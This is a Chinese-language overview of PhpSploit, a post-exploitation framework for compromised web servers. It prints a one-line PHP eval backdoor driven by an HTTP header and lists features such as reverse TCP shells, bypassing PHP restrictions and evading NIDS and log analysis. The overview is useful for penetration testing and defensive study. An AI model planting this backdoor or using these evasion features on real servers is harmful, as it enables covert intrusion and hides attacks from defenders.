PhpSploit是一款远程控制框架，旨在提供一套立足于客户端与Web服务器间HTTP之上的shell类隐形交互连接。这是一款post-exploitation工具，能够对已入侵Web服务器进行接入，从而实现权限提升目标。

概述

其模糊化通信机制通过标准客户端请求与Web服务器相关响应中的HTTP头实现，具体通道则属于一个小型多态后门：

<? @eval($_SERVER['HTTP_PHPSPL01T']) ?>


功能特性

· 高效:可利用超过20款插件实现post-exploitation任务的自动化处理

o 运行命令与浏览器文件系统，绕过PHP安全限制

o 在客户端与目标之间完成文件的上传/下载

o 通过本地文本编辑器实现远程文件编辑

o 在目标系统之上运行SQL控制台

o 传播反向TCP shell

· 隐形:这套框架属于“怀疑论者开发，怀疑论者使用”

o 几乎无法被日志分析及NIDS特征探测所寻获

o 能够绕开安全模式与常见PHP安全限制

o 通信内容被隐藏在HTTP头当中

o 已载入有效载荷经过混淆以绕开NIDS

o 支持http/https/socks4/socks5代理

· 便捷 :提供一套包含众多功能特性的强大界面

o 能够实现客户端与服务器跨平台起效

o 拥有强大的界面以提供多种实现能力及多命令支持效果

o 会话保存/载入功能，且提供持久历史记录

o 面向大型负载提供多请求支持（例如上传）

o 提供一套强大且具备高度可配置能力的设置引擎

o 每项设置，例如用户-探针，皆具备多态模式

o 可定制环境变量以实现插件交互

提供一套完整的插件开发API


支持平台

  • GNU/Linux

  • Mac OS X

  • Windows (experimental)
